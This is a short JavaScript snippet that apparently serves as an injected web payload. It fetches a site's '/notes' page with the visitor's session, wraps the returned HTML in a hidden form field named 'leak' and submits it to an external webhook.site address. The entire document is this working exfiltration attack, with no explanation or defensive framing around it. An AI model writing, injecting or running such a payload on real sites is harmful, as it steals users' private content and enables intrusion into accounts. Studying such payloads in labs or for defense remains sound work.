(async () => {
  try {
    const response = await fetch('/notes');
    const html = await response.text();

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6';

    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'leak';
    input.value = html;

    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
  } catch (e) {
    console.error('Fetch failed', e);
  }
})();
